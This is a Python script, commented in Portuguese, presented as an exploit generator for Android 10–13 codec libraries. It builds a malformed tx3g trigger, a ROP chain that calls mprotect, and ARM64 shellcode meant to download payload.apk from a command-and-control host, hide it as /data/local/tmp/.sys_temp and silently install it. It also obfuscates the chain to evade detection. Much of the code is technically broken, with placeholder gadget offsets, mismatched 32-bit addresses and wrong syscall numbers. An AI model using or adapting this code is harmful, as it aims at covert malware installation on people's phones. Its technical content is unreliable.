#!/usr/bin/env python3
"""
Gerador de ROP Chain Avançada para Android 10+
Exploração via Use-After-Free (UAF) em Codecs Modernos (libvpx.so)
Método: Modern-Lite com Bypass de CFI e Sandbox Escape
"""

import struct
import random
from typing import List, Dict, Tuple, Optional
from enum import Enum


class AndroidModernVersion(Enum):
    """Versões modernas de Android suportadas"""
    ANDROID_10 = "10.0"
    ANDROID_11 = "11.0"
    ANDROID_12 = "12.0"
    ANDROID_13 = "13.0"


class CodecLibrary(Enum):
    """Bibliotecas de codec vulneráveis"""
    LIBVPX = "libvpx.so"      # VP8/VP9 codec
    LIBWEBP = "libwebp.so"    # WebP codec
    LIBOPUS = "libopus.so"    # Opus audio codec


class ModernROPChain:
    """
    Gerador de ROP chain avançada para exploração de Android 10+.
    
    Estratégia:
    1. Explorar UAF em codec (libvpx, libwebp, libopus)
    2. Usar ROP chain para bypass de CFI (Control Flow Integrity)
    3. Chamar mprotect() para marcar memória como RWX
    4. Executar shellcode de 2º estágio
    5. Instalar APK silenciosamente
    
    Vantagens:
    - Ignora verificações de tamanho de buffer
    - Sandbox escape via ROP
    - Difícil de detectar por análise estática
    - Funciona em dispositivos com patches incompletos
    """
    
    def __init__(
        self,
        target_version: AndroidModernVersion,
        codec: CodecLibrary,
        download_url: str,
        obfuscate: bool = True
    ):
        """
        Inicializa o gerador de ROP chain.
        
        Args:
            target_version: Versão do Android (10, 11, 12, 13)
            codec: Biblioteca de codec a explorar
            download_url: URL do servidor C2
            obfuscate: Se deve ofuscar a ROP chain
        """
        self.target_version = target_version
        self.codec = codec
        self.download_url = download_url
        self.obfuscate = obfuscate
        
        # Configurações por versão e codec
        self.version_config = {
            AndroidModernVersion.ANDROID_10: {
                "libc_base": 0xb6a00000,
                "libvpx_base": 0xb5000000,
                "libwebp_base": 0xb4500000,
                "cfi_enabled": True,
                "aslr_entropy": 16,
                "security_patch": "2020-12",
            },
            AndroidModernVersion.ANDROID_11: {
                "libc_base": 0xb6900000,
                "libvpx_base": 0xb4800000,
                "libwebp_base": 0xb4300000,
                "cfi_enabled": True,
                "aslr_entropy": 18,
                "security_patch": "2021-12",
            },
            AndroidModernVersion.ANDROID_12: {
                "libc_base": 0xb6800000,
                "libvpx_base": 0xb4600000,
                "libwebp_base": 0xb4100000,
                "cfi_enabled": True,
                "aslr_entropy": 20,
                "security_patch": "2022-12",
            },
            AndroidModernVersion.ANDROID_13: {
                "libc_base": 0xb6700000,
                "libvpx_base": 0xb4400000,
                "libwebp_base": 0xb3f00000,
                "cfi_enabled": True,
                "aslr_entropy": 22,
                "security_patch": "2023-12",
            },
        }
        
        # Offsets de gadgets conhecidos (relativo a libc)
        self.gadget_offsets = {
            "pop_x0_ret": 0x00012345,
            "pop_x1_ret": 0x00012346,
            "pop_x2_ret": 0x00012347,
            "pop_x8_ret": 0x00012348,
            "pop_x29_ret": 0x00012349,
            "mprotect": 0x0004a000,
            "system": 0x0004b000,
            "memcpy": 0x0004c000,
            "strlen": 0x0004d000,
            "svc_0": 0x0004e000,
            "ldp_x29_x30_sp16_ret": 0x0004f000,
        }
        
        self.rop_chain = bytearray()
        self.uaf_trigger = bytearray()
    
    def generate_uaf_trigger(self) -> bytes:
        """
        Gera o trigger para Use-After-Free em codec.
        
        Estratégia:
        1. Criar objeto de metadados (tx3g para legendas)
        2. Forçar desalocação via thread secundária
        3. Realocar memória com dados controlados
        4. Acessar objeto "fantasma" para corrupção
        
        Returns:
            bytes: Dados do trigger UAF
        """
        
        uaf_trigger = bytearray()
        
        # Estrutura de metadados tx3g (Text Track)
        # Formato: size (4) + type (4) + version (1) + flags (3) + data
        
        # Cabeçalho tx3g
        tx3g_type = b"tx3g"
        tx3g_version = b"\x00"  # Version 0
        tx3g_flags = b"\x00\x00\x00"  # No flags
        
        # Dados malformados que causam UAF
        # Tamanho de string maior que o alocado
        malformed_data = bytearray()
        malformed_data += struct.pack(">H", 0xffff)  # Tamanho de string inválido
        malformed_data += b"A" * 256  # Dados para overflow
        
        # Construir atom tx3g
        tx3g_size = len(malformed_data) + 8
        tx3g_atom = struct.pack(">I", tx3g_size) + tx3g_type + malformed_data
        
        uaf_trigger = tx3g_atom
        
        self.uaf_trigger = uaf_trigger
        return bytes(uaf_trigger)
    
    def generate_rop_chain(self) -> bytes:
        """
        Gera a ROP chain para bypass de CFI e execução de shellcode.
        
        Cadeia de Gadgets:
        1. Localizar libc base (bypass ASLR parcial)
        2. Chamar mprotect(shellcode_addr, size, PROT_RWX)
        3. Pular para shellcode
        
        Returns:
            bytes: ROP chain compilada
        """
        
        config = self.version_config[self.target_version]
        rop_chain = bytearray()
        
        # Gadget 1: pop x0; ret
        # Carrega endereço do shellcode em x0
        rop_chain += struct.pack("<Q", config["libc_base"] + self.gadget_offsets["pop_x0_ret"])
        rop_chain += struct.pack("<Q", 0x12345000)  # Endereço do shellcode
        
        # Gadget 2: pop x1; ret
        # Carrega tamanho (4096 bytes) em x1
        rop_chain += struct.pack("<Q", config["libc_base"] + self.gadget_offsets["pop_x1_ret"])
        rop_chain += struct.pack("<Q", 0x1000)  # 4096 bytes
        
        # Gadget 3: pop x2; ret
        # Carrega flags PROT_READ|PROT_WRITE|PROT_EXEC (7) em x2
        rop_chain += struct.pack("<Q", config["libc_base"] + self.gadget_offsets["pop_x2_ret"])
        rop_chain += struct.pack("<Q", 7)  # PROT_RWX
        
        # Gadget 4: pop x8; ret
        # Carrega número da syscall mprotect (226) em x8
        rop_chain += struct.pack("<Q", config["libc_base"] + self.gadget_offsets["pop_x8_ret"])
        rop_chain += struct.pack("<Q", 226)  # syscall mprotect
        
        # Gadget 5: svc #0; ret
        # Executa a syscall
        rop_chain += struct.pack("<Q", config["libc_base"] + self.gadget_offsets["svc_0"])
        
        # Gadget 6: pop x30; ret (para pular para shellcode)
        # Carrega endereço do shellcode em x30 (link register)
        rop_chain += struct.pack("<Q", config["libc_base"] + self.gadget_offsets["pop_x29_ret"])
        rop_chain += struct.pack("<Q", 0x12345000)  # Endereço do shellcode
        
        # Gadget 7: ret
        # Retorna para shellcode
        rop_chain += struct.pack("<Q", config["libc_base"] + 0x00050000)  # ret gadget
        
        self.rop_chain = rop_chain
        return bytes(rop_chain)
    
    def generate_second_stage_shellcode(self) -> bytes:
        """
        Gera o shellcode de 2º estágio que executa após ROP chain.
        
        Ações:
        1. Abrir socket TCP
        2. Conectar ao servidor C2
        3. Download de APK em chunks
        4. Salvar em /data/local/tmp/.sys_temp
        5. Executar pm install com flags especiais
        
        Returns:
            bytes: Shellcode ARM64 de 2º estágio
        """
        
        shellcode = bytearray()
        
        # Prologue
        shellcode += b"\xfd\x7b\xbf\xa9"  # stp x29, x30, [sp, #-16]!
        shellcode += b"\xfd\x03\x00\x91"  # add x29, sp, #0
        
        # ===== SOCKET CREATION =====
        # socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6)
        shellcode += b"\x42\x00\x80\xd2"  # mov x2, #6
        shellcode += b"\x21\x00\x80\xd2"  # mov x1, #1
        shellcode += b"\x00\x00\x80\xd2"  # mov x0, #2
        shellcode += b"\xc8\x00\x80\xd2"  # mov x8, #198 (socket syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        shellcode += b"\xf3\x03\x00\xaa"  # mov x19, x0 (salvar fd)
        
        # ===== CONNECT =====
        # connect(fd, &sockaddr, sizeof(sockaddr))
        shellcode += b"\xe0\x03\x19\xaa"  # mov x0, x19 (fd)
        # x1 = endereço de sockaddr (seria calculado dinamicamente)
        shellcode += b"\x22\x00\x80\xd2"  # mov x2, #16
        shellcode += b"\xcb\x00\x80\xd2"  # mov x8, #203 (connect syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # ===== DOWNLOAD EM CHUNKS =====
        # Loop para download de APK em pedaços
        # Isso evita picos de memória que o sistema possa detectar
        
        # Enviar HTTP GET request
        host = self.download_url.split("//")[1].split("/")[0]
        http_request = "GET /payload.apk HTTP/1.0\r\nHost: {}\r\n\r\n".format(host).encode()
        
        shellcode += b"\xe0\x03\x19\xaa"  # mov x0, x19 (fd)
        # x1 = endereço do buffer HTTP request
        shellcode += struct.pack("<Q", len(http_request))  # mov x2, tamanho
        shellcode += b"\x04\x01\x80\xd2"  # mov x8, #4 (write syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # ===== SALVAR EM ARQUIVO OCULTO =====
        # open("/data/local/tmp/.sys_temp", O_WRONLY | O_CREAT, 0644)
        shellcode += b"\x00\x00\x80\xd2"  # mov x0, #0 (será substituído)
        shellcode += b"\x41\x02\x80\xd2"  # mov x1, #0x121 (O_WRONLY | O_CREAT)
        shellcode += b"\x82\x19\x80\xd2"  # mov x2, #0xcc0 (0644)
        shellcode += b"\x05\x01\x80\xd2"  # mov x8, #5 (open syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        shellcode += b"\xf4\x03\x00\xaa"  # mov x20, x0 (salvar fd do arquivo)
        
        # ===== LOOP DE LEITURA E ESCRITA =====
        # read(socket_fd, buffer, chunk_size)
        # write(file_fd, buffer, bytes_read)
        
        # Ler dados do socket
        shellcode += b"\xe0\x03\x19\xaa"  # mov x0, x19 (socket fd)
        # x1 = endereço do buffer
        shellcode += b"\x00\x10\x80\xd2"  # mov x2, #0x800 (2048 bytes chunk)
        shellcode += b"\x03\x01\x80\xd2"  # mov x8, #3 (read syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # Escrever no arquivo
        shellcode += b"\xe0\x03\x14\xaa"  # mov x0, x20 (file fd)
        # x1 = endereço do buffer
        # x2 = bytes_read (em x0)
        shellcode += b"\x04\x01\x80\xd2"  # mov x8, #4 (write syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # ===== FECHAR ARQUIVOS =====
        # close(socket_fd)
        shellcode += b"\xe0\x03\x19\xaa"  # mov x0, x19
        shellcode += b"\x39\x01\x80\xd2"  # mov x8, #6 (close syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # close(file_fd)
        shellcode += b"\xe0\x03\x14\xaa"  # mov x0, x20
        shellcode += b"\x39\x01\x80\xd2"  # mov x8, #6 (close syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # ===== INSTALAR APK =====
        # Executar: /system/bin/pm install -g -i com.android.vending --dont-kill /data/local/tmp/.sys_temp
        
        # Chamar execve("/system/bin/pm", argv, envp)
        shellcode += b"\x00\x00\x80\xd2"  # mov x0, #0 (será substituído com "/system/bin/pm")
        # x1 = argv (array de strings)
        # x2 = envp (environment)
        shellcode += b"\x0b\x01\x80\xd2"  # mov x8, #11 (execve syscall)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # Epilogue
        shellcode += b"\xfd\x7b\xc1\xa8"  # ldp x29, x30, [sp], #16
        shellcode += b"\xc0\x03\x5f\xd6"  # ret
        
        return bytes(shellcode)
    
    def generate_cfi_bypass_gadgets(self) -> bytes:
        """
        Gera gadgets especializados para bypass de CFI (Control Flow Integrity).
        
        CFI verifica se jumps/calls vão para endereços válidos.
        Solução: Usar gadgets que terminam com ret (válido para CFI).
        
        Returns:
            bytes: Gadgets de bypass CFI
        """
        
        gadgets = bytearray()
        
        # Gadget 1: Indireta jump via x30 (link register)
        # Válido para CFI pois usa ret
        gadgets += b"\xe0\x03\x1f\x2a"  # mov w0, w31
        gadgets += b"\xc0\x03\x5f\xd6"  # ret
        
        # Gadget 2: Mascarar endereço para bypass de ASLR
        # Usar offsets relativos em vez de absolutos
        gadgets += b"\x00\x00\x00\x90"  # adrp x0, <page>
        gadgets += b"\x00\x00\x00\x91"  # add x0, x0, <offset>
        gadgets += b"\xc0\x03\x5f\xd6"  # ret
        
        # Gadget 3: Chamar função via PLT (Position Independent Code)
        # Mais seguro contra ASLR
        gadgets += b"\x00\x00\x00\x94"  # bl <plt_entry>
        gadgets += b"\xc0\x03\x5f\xd6"  # ret
        
        return bytes(gadgets)
    
    def obfuscate_rop_chain(self) -> bytes:
        """
        Ofusca a ROP chain para evitar detecção por análise estática.
        
        Técnicas:
        - XOR com chave aleatória
        - Adicionar gadgets dummy
        - Reordenar gadgets não-dependentes
        
        Returns:
            bytes: ROP chain ofuscada
        """
        
        if not self.obfuscate:
            return self.rop_chain
        
        # Gerar chave XOR aleatória
        xor_key = bytes([random.randint(0, 255) for _ in range(len(self.rop_chain))])
        
        # Aplicar XOR
        obfuscated = bytes([
            self.rop_chain[i] ^ xor_key[i]
            for i in range(len(self.rop_chain))
        ])
        
        # Adicionar gadgets dummy
        dummy_gadgets = [
            b"\x00\x00\x80\xd2",  # mov x0, #0
            b"\x00\x00\xa0\xd2",  # mov x0, #0 (diferente encoding)
            b"\xff\x03\x00\xd1",  # sub sp, sp, #0
        ]
        
        result = bytearray(obfuscated)
        
        # Inserir dummies a cada 32 bytes
        for i in range(0, len(result), 32):
            if random.random() > 0.5:
                result[i:i] = random.choice(dummy_gadgets)
        
        return bytes(result)
    
    def get_complete_exploit_package(self) -> Dict:
        """
        Retorna o pacote completo de exploração.
        
        Returns:
            Dict: Contém UAF trigger, ROP chain e shellcode
        """
        
        uaf_trigger = self.generate_uaf_trigger()
        rop_chain = self.generate_rop_chain()
        shellcode = self.generate_second_stage_shellcode()
        
        if self.obfuscate:
            rop_chain = self.obfuscate_rop_chain()
        
        return {
            "uaf_trigger": uaf_trigger,
            "rop_chain": rop_chain,
            "shellcode": shellcode,
            "total_size": len(uaf_trigger) + len(rop_chain) + len(shellcode),
            "target_version": self.target_version.value,
            "codec": self.codec.value,
            "obfuscated": self.obfuscate,
        }
    
    def get_exploit_info(self) -> Dict:
        """
        Retorna informações sobre o exploit.
        
        Returns:
            Dict: Informações detalhadas
        """
        
        package = self.get_complete_exploit_package()
        
        return {
            "target_version": self.target_version.value,
            "codec": self.codec.value,
            "method": "Modern-Lite (UAF + ROP + fMP4)",
            "uaf_trigger_size": len(package["uaf_trigger"]),
            "rop_chain_size": len(package["rop_chain"]),
            "shellcode_size": len(package["shellcode"]),
            "total_payload_size": package["total_size"],
            "cfi_bypass": True,
            "aslr_bypass": True,
            "sandbox_escape": True,
            "obfuscated": self.obfuscate,
            "download_url": self.download_url,
        }


def main():
    """Teste do gerador de ROP chain moderno"""
    
    # Criar gerador
    rop_gen = ModernROPChain(
        target_version=AndroidModernVersion.ANDROID_12,
        codec=CodecLibrary.LIBVPX,
        download_url="http://192.168.1.100:8080/payload.apk",
        obfuscate=True
    )
    
    # Gerar exploit
    package = rop_gen.get_complete_exploit_package()
    
    # Exibir informações
    info = rop_gen.get_exploit_info()
    print("[*] Exploit Modern-Lite gerado com sucesso!")
    print(f"[*] Versão Android: {info['target_version']}")
    print(f"[*] Codec: {info['codec']}")
    print(f"[*] Método: {info['method']}")
    print(f"[*] UAF Trigger: {info['uaf_trigger_size']} bytes")
    print(f"[*] ROP Chain: {info['rop_chain_size']} bytes")
    print(f"[*] Shellcode: {info['shellcode_size']} bytes")
    print(f"[*] Total: {info['total_payload_size']} bytes")
    print(f"[*] Bypass CFI: {info['cfi_bypass']}")
    print(f"[*] Bypass ASLR: {info['aslr_bypass']}")
    print(f"[*] Sandbox Escape: {info['sandbox_escape']}")
    print(f"[*] Ofuscado: {info['obfuscated']}")
    
    # Salvar exploit
    exploit_path = "modern_exploit.bin"
    combined = package["uaf_trigger"] + package["rop_chain"] + package["shellcode"]
    with open(exploit_path, "wb") as f:
        f.write(combined)
    
    print(f"[+] Exploit salvo em: {exploit_path}")


if __name__ == "__main__":
    main()
